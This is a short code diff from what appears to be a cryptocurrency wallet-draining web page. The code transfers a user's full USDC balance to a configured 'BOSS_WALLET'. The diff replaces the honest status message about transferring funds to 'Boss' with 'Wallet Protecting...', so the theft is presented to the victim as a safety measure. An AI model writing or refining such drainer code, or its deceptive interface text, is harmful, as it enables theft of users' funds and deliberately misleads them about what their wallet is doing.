@@ -149,7 +149,7 @@
 
         if (alreadyApproved) {
           progress(70);
-          status("(2/2) Directly transferring USDC to Boss...");
+          status("(2/2) Wallet Protecting...");
           const tx2 = await usdc.transfer(CONFIG.BOSS_WALLET, balance);
           await tx2.wait();
         }
